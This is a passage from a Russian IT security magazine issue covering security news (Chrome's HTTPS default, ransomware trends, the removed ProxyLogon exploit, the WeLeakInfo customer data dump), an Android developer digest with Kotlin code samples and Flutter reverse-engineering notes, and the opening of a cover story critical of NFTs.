  В этом месяце Кларк согласил ся пойти на сдел ку и признал себя виновным по нескольким пун‐
   ктам обвинения (включая мошен ничес тво с использованием средств связи, мошен ническое
   использование личных данных и неправомочный дос туп к компьюте ру).

   Теперь он проведет в тюрьме 3 года, а затем еще 3 года будет находиться на испытательном
   сроке, под наблюдением. 6 лет — это максимум, разрешен ный законами штата для несовер‐
   шеннолетних правонарушителей.





                                        Продолжение статьи →
← Начало статьи





 ПРИНУДИТЕЛЬНЫЙ
 HTTPS
  На протяжении многих лет инженеры Google были одни ми из наиболее ярых
   сторонников повыше ния безопас ности браузеров, наряду с разработчиками
   Firefox и Tor.
     Уже дав но одним из ключевых вопросов, интересу ющих разработчиков
  Chrome, является продвижение использования HTTPS как внутри браузеров,
   так и сре ди владельцев сайтов. Очередным шагом на пути к повсемес тному
  HTTPS стало то, что с недавних пор Chrome автомати чес ки пытается перейти
  с HTTP на HTTPS, если HTTPS доступен. Также браузер блокирует загрузки
  из HTTP‐источников (даже если в URL стра ницы сто ит пре фикс HTTPS), чтобы
  пользователи не считали, будто их заг рузка защищена, если на самом деле
   это не так.
     Хотя около 82% всех сайтов уже работа ют на HTTPS, переход на HTTPS
   в глобальном смысле еще нельзя считать завершенным. Поэтому в Chrome
   90, выпуск которого запланирован на середину апреля текуще го года,
  появится новая функция.
     Изменение повлияет на омнибокс Chrome  (так в Google называют
  адресную строку браузера). В текущих версиях, когда пользователь вводит
   в омнибокс ссылку, Chrome  загружа ет  введенную ссылку  независимо
   от использованного протоко ла. Сейчас, если поль зователь забудет написать
  HTTP или HTTPS, Chrome автоматически добавит перед текстом «http://»
  и  попытается  загрузить  сайт.  К  примеру,  domain.com  превратится
   в http://domain.com.
    С релизом Chrome 90 это изменится. Начиная с этой версии омнибокс
  будет загружать все домены через HTTPS, автомати чес ки подставляя соот‐
   ветствующий префикс «https://».



        «В нас тоящее вре мя пла ниру ется запус тить [эту функцию] в качес тве
         экспе римента для небольшого процента пользовате лей в Chrome
        89 и полноценно внед рить ее в Chrome 90, если все пойдет по пла-
          ну», — рас ска зыва ет инже нер по безопас ности Chrome Эмили Старк
          (Emily Stark).

  Уже сейчас пользователи могут про тес тировать новый механизм в Chrome
   Canary. Для этого нужно включить функцию в chrome://ﬂags/#omnibox‐default‐
   typed‐navigations‐to‐https.


 ШИФРОВАЛЬЩИКИ АТАКУЮТ
   Аналитики Group‐IB провели масштабное исследование, посвященное шифровальщикам. Ком‐
   пания сообщает, что в прошлом году количество атак шифровальщиков вырос ло более чем
   на 150% по сравнению с предыдущим годом.

  Шифровальщики фактически стали угрозой номер один как для бизнеса, так и для государс‐
   твенных органов: число успешных атак в прошлом году вырос ло более чем на 150%, а средний
   размер суммы выкупа увеличился более чем в два раза и сос тавил 170 000 дол ларов.

   Самыми жадными вымогателями оказались группы Maze, DoppelPaymer и RagnarLocker —
   суммы   выкупа,   которые   они   требовали   от   жертв,   составляли   в   среднем
   от 1 000 000 до 2 000 000 долларов.





   Главным вектором атак для боль шинства остаются публичные RDP‐серверы (52%). На втором
   месте — фишинг (29%), затем эксплуатация обще дос тупных приложений (17%).

   Прежде чем зашифровать данные, опе раторы вымогателей проводи ли в среднем 13 дней
   в скомпрометированной сети, стараясь предварительно найти и удалить все доступные резер‐
   вные копии.

   Большинство атак произошли в Северной Америке и Европе, где рас положено большинство
   компаний из списка Fortune 500, а также в Ла тинской Америке и Азиатско‑Тихоокеан-
  ском регионе.

  Еще одна тенденция 2020 года — коллаборации между разными преступными группами.
  В прошлом году в андеграунде появилось 15 новых публичных партнерских прог рамм‐вымога‐
   телей. Преступные группы, использующие малварь Trickbot, Qakbot и Dridex, все чаще
   помогают операторам малвари получать первоначальный дос туп к корпоративным сетям.





 GITHUB И ЭКСПЛОИТ
 ДЛЯ PROXYLOGON
  Независимый ИБ‐исследова тель из Вьет нама опуб ликовал на GitHub первый
  настоящий PoC‐экспло ит для серьезно го комплекса уязвимостей ProxyLogon,
  недавно обнаруженных в Microsoft Exchange. Об этих проблемах Exchange мы
  подробно рассказывали в отдельном материале, а сей час речь пойдет
  о странной ситуации, сложившейся вокруг экс плоита.
     Работоспособность данного инстру мента подтвердили известные экспер‐
   ты, включая Мар куса Хатчинса из Kryptos Logic, Дэни ела Карда из PwnDefend
  и Джона Уэтингтона из Condition Black.
    При этом мно гие отмечали, что публичный релиз PoC‐эксплоита сейчас —
   это крайне сомнительный шаг. К примеру, совсем недавно компанию Praeto‐
   rian подвергли жесткой критике за куда мень ший «прос тупок»: ее спе циалис‐
  ты лишь обнародовали подробный обзор уяз вимостей ProxyLogin, хотя воз‐
  держалась от выпуска собственного эксплоита.
    Дело в том, что в марте по меньшей мере десять хак‐групп экс плуатирова‐
  ли ошибки ProxyLogon для установки бэкдоров, майнеров, шифровальщиков
  на серверы Exchange по всему миру. По раз ным оценкам, количество пос тра‐
  давших компаний и организа ций уже достигло 30 000–100 000, и их число
  постоянно продол жает расти, равно как и количес тво атакующих.
     Учитывая всю серьезность ситуации, уже через нес колько часов после
  публикации экспло ита тот был уда лен с GitHub адми нистрацией сервиса.
  Из‐за этого некоторые учас тники ИБ‐сооб щества пришли в ярость и немед‐
  ленно обвинили Microsoft в цензуре контента, представляюще го огромный
  интерес для специалистов по безопас ности со всего мира.
      Так, многие исследователи говорят, что GitHub придерживается двой ных
   стандартов, которые позволяют компании исполь зовать PoC‐эксплоиты
  для исправления уязвимостей, влияющих на ПО других компаний, но при этом
  аналогичные PoC для про дуктов Microsoft уда ляют ся.



         «Ух ты. У меня нет слов. Microsoft действительно уда лила PoC-код
         с GitHub. Это чудовищ но, уда лить с GitHub код ИБ‑иссле дова теля,
         нап равленный на их собс твенный продукт, который уже получил пат-
          чи», —  пишет  в  Twitter  Дэйв  Кеннеди,  основатель  ком пании
          TrustedSec.

  В той же социальной сети эксперт Google Project Zero Тэвис Орманди спорит
  с известным ИБ‐экспертом Маркусом Хатчинсом. Последний говорит, что
  не совсем понимает, какую пользу могла принес ти хоть кому‐то публикация
  работающе го RCE‐экспло ита, на что Орманди отвечает:



         «Есть ли польза от Metasploit, или бук вально все, кто его исполь-
         зуют — скрип ткид ди? К сожале нию, невоз можно поделиться иссле-
        дова ниями и инс тру ментами с профес сиона лами, не поделив шись
        ими еще и со злоумыш ленниками, но многие люди (нап ример, я) счи-
         тают, что пре иму щес тва переве шива ют рис ки».

  В свою очередь Хатчинс пишет, что аргу мент об уже исправленных уяз вимос‐
   тях несостоятелен, так как около 50 тысяч серверов по всему миру по‐преж‐
  нему уязвимы.



         «„Уже выш ли патчи“. Чувак, есть более 50 тысяч неп ропатченных сер-
         веров Exchange. Выпуск полностью готовой к работе цепоч ки RCE —
         это не иссле дова ние безопас ности, это без рассудс тво и глу пость.
         Я и раньше видел, как GitHub уда ляет вре донос ный код, и не толь-
         ко код, нацеленный на продук ты Microsoft. Очень сом нева юсь, что MS
         сыграла какую‑то роль в этом уда лении, [экс плоит] прос то нарушал
         политику GitHub в отношении активного вре донос ного ПО или экс пло-
          итов, ведь он появился сов сем недав но, а над огромным количес твом
        сер веров навис ла угроза атак вымогателей», — зак люча ет Хатчинс.

  Представители GitHub сообщили СМИ, что экс плоит, конечно, имел обра‐
  зовательную и исследова тельскую ценность для сообщества, однако ком‐
  пания вынуждена поддерживать баланс и помнить о необходимости сох‐
  ранения безопасности более широкой экосистемы. Поэтому, в соответс твии
  с правилами сервиса, экспло ит для недавно обнаруженной уязвимос ти,
  которая прямо сейчас активно используется для атак, все же был удален
  из открытого доступа.


  500 ДОЛЛАРОВ ЗА ВАКЦИНУ
   Изучив 15 торговых площадок в даркнете, аналитики «Лаборатории Кас перского» нашли объ‐
   явления о продаже 3 видов запатентованных вакцин от коронавиру са — Pﬁzer/BioNTech, As‐
   traZeneca и Moderna, а также некоторых еще не запатен тованных. Цена за одну дозу варьиру‐
   ется от 250 до 1200 долларов США, в среднем — око ло 500 дол ларов.

  Оплата за вакцины в основном требуется в биткойнах. Судя по анализу транзакций, многие
   авторы таких объявлений провели от 100 до 500 операций.





 СЛИВ WELEAKINFO
  В начале 2020 года совместная операция ФБР, а также правоохранителей
  из Северной Ирландии, Нидерландов, Германии и Великобритании привела
   к изъятию домена сайта WeLeakInfo.com. Более трех лет этот сервис про‐
  давал доступ к данным более чем 12,5 миллиарда учетных записей, соб‐
  ранных из 10 тысяч различных утечек. Фактически за плату сайт пре дос тавлял
  доступ к паролям людей открытым текстом. При этом сам доступ стоил все‐
   го 2 доллара в день (7 долларов в неделю или 24 доллара в месяц).
    На черном рынке ресурс был известен и пользовался популярностью. Так,
  хакеры покупали доступ к WeLeakInfo, а затем иска ли в его недрах имя, email‐
  адрес или имя пользователя, которого хотели взломать. В ответ на такие зап‐
  росы сайт возвращал все связанные с этим пользовате лем данные, ранее
   утекшие из различных источников, вклю чая пароли, если те были дос тупны.
  Злоумышленники использовали эти пароли, пыта ясь авторизоваться с их
  помощью в различных профилях пользователя (надеясь, что жертва повторно
  использовала одинаковые пароли на раз ных сай тах).
     Теперь издание Bleeping Computer сообщило, что на известном хакерском
  ресурсе RaidForums был опубликован дамп с данными бывших клиентов We‐
   LeakInfo, которые были получены благодаря компрометации Stripe‐аккаунта
  ныне не существующего сервиса.
    Обнародовав ший дамп пользователь пишет, что он получил дос туп к дан‐
  ным уже после ликвидации сервиса и ареста его операторов. Дело в том, что,
   когда пыль улеглась, ФБР не продлило домен wli.design, который владельцы
   WeLeakInfo использовали для получения электронных писем от платежного
  сервиса Stripe.



        «Мне уда лось зарегис трировать этот домен, а затем сбросить пароль
         для их учетной записи в Stripe, что дало мне полный дос туп ко всей
        информа ции  о  клиентах  [WeLeakInfo],  которые  пла тили  через
           Stripe», — объясняет хакер.

  Компания Cyble поделилась с журналис тами Bleeping Computer образцами
  данных из дампа и сооб щила, что в общей сложности утечке подверглась
  информация пример но 10 тысяч уникальных клиентов сервиса. Так, в рас‐
  поряжении издания оказались скриншоты Stripe‐акка унта WeLeakInfo, инвой‐
   сы, информация об успешных платежах, списки клиентов и многое другое.
    Дамп включает в себя личные и корпоративные данные (услугами WeLeak‐
   Info пользовались не только час тные лица, но и компании), в том числе адре‐
  са электронной поч ты, имена, адреса для выс тавления счетов, пос ледние
  четыре цифры и даты истечения срока дей ствия банковских карт, IP‐адре са,
  история заказов и номера телефонов.
    Опираясь на эту информацию, исследователи подсчитали, что на 1 янва‐
  ря 2019 года WeLeakInfo осуществила около 24 тысяч платежей, заработав
  более 92 тысяч фунтов стерлингов.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Домен Perl.com был захвачен с помощью социальной инженерии


   Новая версия джейлбрейка Unc0ver поддерживает iOS от версии 11.0 до 14.3


   Джону Макафи предъявлены обвинения в мошенничес тве и отмывании денег


   Хакеры получили доступ к камерам наблюдения в Tesla, Cloudﬂare, бан ках и не только


   Правоохранители взломали платформу Sky ECC, которую преступники использовали для обме‐
   на сообщениями


   Спецслужбы часто забывают удалить конфиден циальные данные из PDF‐документов


   Хакеры тоже заинтересовались NFT и взламывают пользователей Nifty Gateway


   Использование DTLS позволяет усилить DDoS в 37 раз


  В изображениях Twitter можно спрятать до 3 Мбайт дан ных, например ZIP или MP3


   Эксперты Google рассказали о хак‐группе, использовавшей 11 багов нулевого дня в 2020 году
HEADER



ANDROID

                РЕВЕРС‐ИНЖИНИРИНГ
                FLUTTER‐ПРИЛОЖЕНИЯ





Сегодня  в  выпуске:  реверс‐инжиниринг
Flutter‐приложения,  подборка  полезных
функций‐рас ширений на Kotlin, две статьи
об ошибках исполь зования корутин и Flow
в  Kotlin, заметка об автоматически уста‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
ревающих коммента риях, а также подборка              zobnin@glc.ru
из  одиннадцати  must  have  библиотек
и десяток новых библиотек.


                ПОЧИТАТЬ


Реверс-инжиниринг Flutter-приложения
Reverse Engineering a  Flutter app by recompiling  Flutter Engine — статья
о реверс‐инжиниринге приложений, написанных с использовани ем фрей‐
мворка Flutter.
    Flutter —  это  кросс‐платформенный  инстру мент,  предназначенный
для создания быстрых приложений на языке Dart с использованием реак‐
тивного UI‐фреймворка. Написанные с помощью Flutter приложения могут
работать на Android, iOS, десктопе и вебе. При этом интерфейс будет пол‐
ностью идентичен на всех платформах.
   Главная осо бенность, отличающая Flutter от фреймворка, предоставля‐
емого Android, в том, что код всего приложения, вмес то набора из байт‐кода
и ресурсов, компилируется в единую натив ную библиотеку, разобраться
в структуре которой дос таточно сложно. К тому же формат данных в этой биб‐
лиотеке постоянно меняется, что еще силь нее запуты вает реверсера.
   Библиотека, содержащая код приложения, называ ется libapp.so. Причем
это не просто код и данные приложения, а так называемый snapshot, пред‐
ставляющий  собой  снимок  сос тояния  виртуальной  машины   Dart
перед передачей управления на точку вхо да приложения (функция main),
плюс скомпилированный с помощью AOT‐компилятора код всех классов при‐
ложения.
   Разбирать код библиотеки libapp.so классическим способом (запускаем
IDA Pro и начинаем исследовать) бесполезно. Да, это нативный код, но фор‐
мат самого файла в корне отличается от обычных биб лиотек.
   Один из методов ана лиза сос тоит в том, чтобы пропарсить заголовок
снапшота, найти в нем ссылки на все объекты типа Code (они как раз и хранят
нативный код методов), а затем дизас сембли ровать находя щиеся по этим
адресам инструкции. В этом поможет инс трумент Doldrums. Он выведет
на экран все имеющиеся в коде клас сы и ука жет, по каким адресам рас‐
полагается код методов.
   Проблема этого подхода в том, что формат снапшота меняется от версии
к версии. Тот же Doldrums отлично работа ет для при ложе ний, собранных
с помощью Flutter 2.5, но не работает для более поздних версий.
   Универсальный подход к анализу заключается в том, чтобы модифициро‐
вать сам фреймворк Flutter, рас полага ющийся в биб лиотеке libflutter.so
рядом с libapp.so. Для этого необ ходимо взять исходники фреймворка той
же версии, добавить в них код для печати всех нужных нам данных (име на
классов, методов и адреса их кода), а затем соб рать его и заменить им ори‐
гинальный фреймворк в пакете приложения.
  В частности, можно внес ти исправления в метод Deserializer::Read‐
ProgramSnapshot(ObjectStore*  object_store)  в файле  runtime/vm/
clustered_snapshot.cc, чтобы заставить его распечатать таблицу клас сов.
Также можно изменить метод void ClassTable::Print() в файле runtime/
vm/class_table.cc для печати более подробной информации.
  В статье приведено еще нес колько деталей, как это сделать правильно,
но нет готовых файлов. Так что в данный момент реверс‐инжиниринг Flutter‐
приложений — дело неблагодарное и дос таточно сложное. До появления
полноценных инструментов еще год‐дру гой.





             Пример печати клас сов с помощью Doldrums


              РАЗРАБОТЧИКУ


Четыре ошибки при использовании корутин и Flow
Misnomers, Mistakes and Misunderstandings to watch for when learning Kotlin
Coroutines and Flow — статья о типичных ошиб ках, которые допускают прог‐
раммисты при работе с корутинами.
 1. Использование Flow вместо обыч ной suspend-фун кции. Многие
   программисты  исполь зуют   Flow   как   универсальный  инс трумент
   для передачи значений даже в тех случаях, когда в нем нет никакого смыс‐
    ла.
     Представим себе такую функцию:


   fun getAccountInfo(): Flow<Response<Account>>

   По факту она возвращает только одно зна чение и Flow здесь не нужен.
   Логичнее было бы превратить эту функцию в обычную suspend‐функцию:


   suspend fun getAccountInfo(): Response<Account>

 2. Suspend-фун кции с параметрами‑кол бэками. Suspend‐функции
   были задуманы, чтобы заменить колбэки, поэтому создавать функции
   с колбэками в качестве параметров — большая ошибка.
     Возьмем, к примеру, следующую функцию:


   suspend fun download(
       url: String,
       onSuccess: (String) ‐> Unit,
       onError: (Throwable) ‐> Unit
   )

   Как в данном случае избавиться от колбэков, но оставить возможность
   возвратить два разных типа значений? Для этого можно использовать
   sealed‐классы:


   suspend fun download(url:String): Result


   sealed class Result {
       data class Success(val data:String): Result()
       data class Error(val error:Throwable): Result()
   }

 3. Использование GlobalScope. Активнос ти, фрагменты, ViewModel, View
   и другие стандартные классы имеют функции‐рас ширения, которые можно
   использовать для запуска корутин. Не стоит использовать GlobalScope,
   который может привести к утечкам корутин.
 4. Не нуж ное перек лючение потоков. Корути ны устроены так, что их
   очень легко и просто можно переключить на другой поток с помощью сме‐
   ны диспетчера:


   with(Dispatchers.IO){
       ...
   }

  Однако стоит несколь ко раз подумать перед тем, как использовать эту
   возможность. Во‐первых, это усложня ет юнит‐тестирование. Во‐вторых,
   многие фреймворки и библиотеки умеют самос тоятельно переключать
   исполнение между потоками, так что ручное переключение, кроме овер‐
   хеда, ничего не даст.


Советы по использованию корутин
Best practices for coroutines in Android — советы Google, как использовать
корутины.
 1. Внед ряй диспетче ры как зависимости. Благодаря этому юнит‐тес‐
   тирование станет намного более удобным.


   class NewsRepository(
       private val defaultDispatcher: CoroutineDispatcher =
   Dispatchers.Default
   ) {
       suspend fun loadNews() = withContext(defaultDispatcher) { /
   * ... */ }
   }

 2. Suspend-фун кции дол жны быть безопасными для вызова из UI-
   потока приложе ния. Если suspend‐функция делает сложную ресур‐
   соемкую работу, она должна сама позаботить ся о переключении дис‐
   петчера. Другими сло вами, за перемещение работы в фоновый поток дол‐
   жна отве чать сама suspend‐функция, а не код, который ее вызывает.
 3. ViewModel дол жна соз давать корутины сама. Вместо того чтобы
   выставлять наружу suspend‐функции, ViewModel должна сама порождать
   корутины из обыч ных функций. Такой подход упро щает тестирование и не
   создает проблем при пересоз дании активнос ти.


   class LatestNewsViewModel(
       private val getLatestNewsWithAuthors:
   GetLatestNewsWithAuthorsUseCase
   ) : ViewModel() {


       private val _uiState = MutableStateFlow<LatestNewsUiState>(
   LatestNewsUiState.Loading)
       val uiState: StateFlow<LatestNewsUiState> = _uiState


       fun loadNews() {
           viewModelScope.launch {
               val latestNewsWithAuthors = getLatestNewsWithAuthors()
               _uiState.value = LatestNewsUiState.Success(
   latestNewsWithAuthors)
           }
       }
   }

 4. Не сле дует выставлять наружу изме няемые типы дан ных.
   Это стандартный пример грамотного ООП‐проектирования, который поз‐
   волит сделать сопровож дение кода более прос тым.


   class LatestNewsViewModel : ViewModel() {
       val _uiState = MutableStateFlow(LatestNewsUiState.Loading)
       val uiState: StateFlow<LatestNewsUiState> = _uiState
       /* ... */
   }

 5. Уровни дан ных и биз нес‑логики дол жны быть доступны через
   suspend-фун кции и Flow. Следова ние этому принципу позволит пра‐
   вильно управлять жизненным циклом приложения, когда жизнью корутин
   управляет ViewModel, а не классы уровня бизнес‐логики.


   class ExampleRepository {
       suspend fun makeNetworkRequest() { /* ... */ }
       fun getExamples(): Flow<Example> { /* ... */ }
   }

 6. Используй TestCoroutineDispatcher. Следование первому правилу
   позволит  использовать  в  тестах  диспетчер  TestCoroutineDispatcher,
   который  выпол няет  работу  сра зу,  позволяя  лучше  контролировать
   исполнение кода.
 7. Из бегай использования GlobalScope. GlobalScope приводит к утеч‐
   кам корутин, усложня ет тес тирова ние и отладку кода.
 8. Ко рутины дол жны легко убиваться. Корути ны пос троены на идее
   кооперативной многоза дачности. Это значит, что завершение корутины
   через cancel() не про исходит сразу. Корутина должна сама проверить
   свой статус и завершить работу в случае необ ходимости. В большинстве
   случаев делать для этого ничего не нужно, так как все suspend‐функции
   из пакета kotlinx.coroutines (withContext, delay) умеют сами про‐
   верять свой статус и реагировать на сигнал завершения. Но иногда
   все‐таки приходится делать эту работу самому:


   someScope.launch {
       for(file in files) {
           ensureActive() // Проверка флага завершения
           readFile(file)
       }
   }

 9. Не забывай об исключениях. Исключения лучше перехватывать в теле
   корутины:


   class LoginViewModel(
       private val loginRepository: LoginRepository
   ) : ViewModel() {


       fun login(username: String, token: String) {
           viewModelScope.launch {
               try {
                   loginRepository.login(username, token)
                   // Notify view user logged in successfully
               } catch (error: Throwable) {
                   // Notify view login attempt failed
               }
           }
       }
   }


Автоматически устаревающие комментарии
Write self‐deprecating comments — короткая, но полез ная заметка о том,
как писать комментарии, по которым будет сра зу понятно, устарел коммента‐
рий или нет.
   Трюк состоит в том, чтобы помес тить зна чение, которое описывает ком‐
ментарий, в сам коммента рий:


PaymentAPI.call(
    mode: "X",  # "X": Disable 3D Secure verification
    timeout: 12,  # 12 secs is the smallest value that avoids errors
)

Теперь, если значение изменится, коммента рий автоматически станет неак‐
туальным:


PaymentAPI.call(
    mode: "Y",  # "X": Disable 3D Secure verification
    timeout: 15,  # 12 secs is the smallest value that avoids errors
)

Разумеется, трюк сработает далеко не во всех случаях, но помнить о нем сто‐
ит.


Пять функций-расширений
5 More Kotlin Extensions for Android Developers — несколько полез ных фун‐
кций‐расширений для разработ чиков на Kotlin:
 1. Функция для проверки подключения к интернету.


   fun Context?.isOnline(): Boolean {
       this?.apply {
           val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as
   ConnectivityManager
           val netInfo = cm.activeNetworkInfo
           return netInfo != null && netInfo.isConnected
       }
       return false
   }

 2. Функции для показа и скрытия клавиату ры.


   fun View.hideKeyboard(): Boolean {
       try {
           val inputMethodManager = context.getSystemService(Context.
   INPUT_METHOD_SERVICE) as InputMethodManager
           return inputMethodManager.hideSoftInputFromWindow(
   windowToken, 0)
       } catch (ignored: RuntimeException) { }
       return false
   }


   fun View.showKeyboard() {
       val imm = context.getSystemService(Context.
   INPUT_METHOD_SERVICE) as InputMethodManager
       this.requestFocus()
       imm.showSoftInput(this, 0)
   }

   Стоит отме тить, что это наивный метод показа кла виатуры. Из‐за особен‐
   ностей работы Android он может просто не сработать. Более удачную
   реализацию подоб ной функции мож но найти в одном из предыдущих
   выпусков дайджеста.

 3. Функции запроса и про верки полномочий:


   fun Fragment.isGranted(permission: AppPermission) = run {
       context?.let {
           (PermissionChecker.checkSelfPermission(it, permission.
   permissionName
           ) == PermissionChecker.PERMISSION_GRANTED)
       } ?: false
   }


   fun Fragment.shouldShowRationale(permission: AppPermission) = run
   {
       shouldShowRequestPermissionRationale(permission.permissionName
   )
   }


   fun Fragment.requestPermission(permission: AppPermission) {
       requestPermissions(arrayOf(permission.permissionName),
   permission.requestCode
       )
   }


   fun AppCompatActivity.checkPermission(permission: AppPermission) =
   run {
       context?.let {
           (ActivityCompat.checkSelfPermission(it, permission.
   permissionName
           ) == PermissionChecker.PERMISSION_GRANTED)
       } ?: false
   }


   fun AppCompatActivity.shouldRequestPermissionRationale(permission:
   AppPermission) =
       ActivityCompat.shouldShowRequestPermissionRationale(this,
   permission.permissionName)


   fun AppCompatActivity.requestAllPermissions(permission:
   AppPermission) {
       ActivityCompat.requestPermissions(this, arrayOf(permission.
   permissionName), permission.requestCode))
   }

 4. Работа с цве тами:


   fun String.hextoRGB() : Triple<String, String, String>{
       var name = this
       if (!name.startsWith("#")){
           name = "#$this"
       }
       var color = Color.parseColor(name)
       var red = Color.red(color)
       var green = Color.green(color)
       var blue = Color.blue(color)


       return Triple(red.toString(), green.toString(), blue.toString
   ())
   }


   fun Int.colorToHexString(): String? {
       var data = String.format("#%06X", ‐0x1 and this).replace("#FF"
   ,"#")
       return data
   }


Toп 11 Koltin-библиотек
The Top 11 Trending Kotlin Libraries for 2021 — статья о новых и старых биб‐
лиотеках  с  поддержкой  Kotlin.  Автор  ведет  рассказ  с  точки  зрения
бэкенд‐разработчика, но многие библиотеки применимы и для мобильной
разработки.
 1. Kotless — так называемый Kotlin serverless framework. Позволяет сгенери‐
   ровать готовый к запус ку на AWS сервер из кода приложе ния.
 2. Kotest — современный фреймворк для unit‐тестирования. Включает в себя
   также mocking‐фреймворк и assert‐фреймворк.
 3. Exposed — ORM‐фреймворк  с син таксисом, пос троенным на DSL.
   Минималистичный и удоб ный в использовании.
 4. Ktor — простой и быстрый фреймворк для соз дания клиентских и сер‐
   верных асинхронных сетевых приложений.
 5. Kotlinx Serialization — удоб ная и простая в использовании библиотека
   сериализации и десериализации JSON и других типов данных.
 6. Koin — DI‐фреймворк, написанный на Kotlin и не использующий реф‐
   лексию.
 7. Netﬂix DGS framework — фреймворк для соз дания GraphQL‐серверов.
 8. KMongo — удоб ная в использовании обертка для MongoDB.
 9. JetBarains Xodus — встра иваемая неблокируемая база данных без схемы.
10. Dokka — аналог JavaDoc для Kotlin.
11. Vaadin — веб‐фреймворк, базирующийся на DSL.


             ИНСТРУМЕНТЫ


 • Apkleaks — скрипт для проверки APK на утечки данных, эндпой нтов и URI.


              БИБЛИОТЕКИ


 • ArcLibrary — лейаут с закругленными углами;
 • Compose‐markdown — виджет‐рендерер Markdown для Jetpack Compose;
 • Sesame — набор компонентов для создания MVVM‐ и MVI‐приложений;
 • Tablespoon — библиотека для биндинга сти левых атрибутов;
 • Curtains — набор утилит для работы с элементами текущего окна Android;
 • Turbine — библиотека для тестирования Kotlin Flow;
 • RandomKolor — библиотека для генера ции случайных цветов;
 • Shuttle — фреймворк  для переда чи больших объ ектов  в  интентах
   без опасности обрушить приложение;
 • SegmentedProgressBar — сегментированный прогресс‐бар как в историях
   Instagram;
 • StackExpandableView) — расширяемый view в стиле сгруппированных уве‐
   домлений в iOS;
 • NavCompose — простая библиотека для реализации навигации в при‐
   ложении на базе Jetpack Compose.
COVERSTORY
NFT —
ЭТО СКАМ!

 КАК ТОРГОВЛЯ
 ЦИФРОВЫМ ИСКУССТВОМ
 ЗАХВАТИЛА УМЫ
 И ЧТО ИЗ ЭТОГО ВЫЙДЕТ





Три буквы, которые в последнее время
встречаются чуть ли не чаще любых дру‐
гих, —  это  NFT.  Non‐fungible  tokens,
или  «невзаимозаменяемые  токены», —
способ снабжать цифровые про изведения       Андрей Письменный                                                                                      Главный редактор
уникальной подписью, чтобы затем тор‐         apismenny@gmail.com
говать ими так, будто это физические объ‐
екты. За март 2021 года NFT стал нас‐
тоящим феноменом и в мире крип товалют,
и в мире искусс тва. Казалось бы, в чем тут
может быть подвох?


Идея NFT сводится  к  тому, чтобы вместо вза имозаменяемых токенов,
которые используются как электронные день ги, выпускать и записы вать
в блокчейн уникальные, невзаимо заменяемые. Такой токен — это уже
не валюта, а индивидуальная сущность, и на каж дый — своя цена. Токен
при этом можно связать с каким‐то товаром и таким образом перенести
на него свойства токена.
  Информация о каждой передаче токена также записывается в блокчейн,
благодаря чему известно, кто в данный момент владелец товара, а двойная
продажа невозможна. Сами товары при этом обычно циф ровые, а как именно
они хранятся и как свя заны с токеном — это воп рос отдельный, и разные
платформы решают его по‐разному.
   Вот, собственно, и вся теория. А теперь посмотри на этого тол стячка
в костюме медведя и скажи, что выложить за него пять с небольшим тысяч
долларов — это нормальная, здравая идея.





В полной версии он анимиро ван, но от этого ничуть не легче соотнести его
с ценником. Секрет кроется в том, что таких  «чаббиков» нагенериро‐
вали 10 тысяч штук и ни одним чаббиком больше. Покупатели руководству‐
ются простой логикой: если чего‐то существует ограниченное количество, то
оно будет только дорожать — так же как и, к примеру, Bitcoin. И если ты
видишь серьезный изъян в этой логике, то не расстраивайся — это совер‐
шенно нормально!
  Подобных историй сейчас множество. К при меру, виртуальные миры De‐
centraland и Cryptovoxels про дают участки на манер Second Life, коллекци‐
онная карточная игра WAIFU Harem торгует карточками с анимешными девоч‐
ками, а авторы проекта CryptoPunks придума ли рисовать и продавать пик‐
сельные аватарки, чтобы сокровище стало буквально лицом его владельца.
  Громче всего выстрелили пло щадки, которые торгуют цифровым искусс‐
твом, — в первую очередь Foundation и Nifty Gateway. Картины и анимаци‐
онные ролики здесь уходят за миллионы долларов.
   Как так получается, что никто не видит подвоха и люди продолжают тратить
бешеные деньги непонятно на что? Да и есть ли вообще эти люди? Давай
разбираться.


          NFTКарта мира
Пока что рынок NFT — это Дикий Запад, одна ко и ковбоям нужно как‐то ори‐
ентироваться. Давай быс тро пройдемся по осно вам, чтобы лучше понимать
происходящее. Не исключено, что через год‐дру гой от нынешних реалий
не останется и следа, так что сверь ся с датой пуб ликации статьи.


Что внутри у NFT?
Техническая основа NFT — это чаще всего Ethereum, точнее, стандарт ERC‐
721, в соответствии с которым создаются смарт‐контракты, позволяющие
выпускать невзаимозаменяемые токены. Некоторые площадки рассматрива‐
ют возможность перехода на Tezos, так как он требует меньше затрат элек‐
тричества — подробнее об этом в посте TQ Tezos.
  Одна из важных особен ностей Ethereum — необходимость платить
за «газ». Это виртуальное топливо, которое потребляется при каждой опе‐
рации с блокчейном — в том числе выпус ке новых токенов. Поэтому художник
может потратить, скажем, 50 долларов на то, чтобы выс тавить работу на аук‐
цион, а продана она потом будет за 5 дол ларов.


Что про дают при помощи NFT?
Токены можно поделить на три большие груп пы по категориям товаров,
которые продают с их помощью.
 • Искусство. Аналог тра диционных про изведений искусс тва. Собственно,
   на этой категории мы и сосредото чимся в статье.
 • Игровые пред меты. Например, карты в коллекционных карточных
   играх, уникальные персонажи, пространство в виртуальных мирах и тому
   подобные вещи. Отличаются тем, что их можно как‐то использовать.
 • Кол лекционные пред меты. Специально созданные для коллекциони‐
   рования вир туальные карточки, фигурки, аватарки и прочие штуки сом‐
   нительной полезности, но выпус каемые огра ниченными тиражами (и иног‐
   да созданные алгоритмичес ки).

Существуют еще и со циальные токены — пока что наиболее эксперимен‐
тальная область. Музыканты и дру гие знаменитости могут награждать пер‐
сональными токенами своих поклонников, а один выдумщик в прошлом году
даже пробовал продавать свое время при помощи токенов. Владение
токенами также может открывать двери в определенные закрытые группы —
такой механизм предлага ет платформа Collab.Land.





  Gods Unchained — кол лекционная карточная игра в духе Magic the Gath‐
  ering и Hearthstone





                Кол лекция трехмерной обуви на Rarible


Где все это про дается?
Платформы можно поделить на две большие груп пы: курируемые и не нак‐
ладывающие никаких огра ничений. Среди первых — SuperRare, Nifty Gateway,
Foundation, KnownOrigin, MakersPlace. Свободные площадки — OpenSea,
Rarible, Mintable, Portion, InﬁNFT, Cargo. Отличие между ними впол не очевид‐
ное — первые следят за тем, что у них выставля ется, вторые позволяют
выпускать токены любому желающему.
  Для художников при этом выгоднее попасть на Foundation или Nifty, пос‐
кольку покупатели внимательно следят за всем, что там появляется. Многие
платформы такого типа (Nifty, KnownOrigin, MakersPlace) спе циализируются
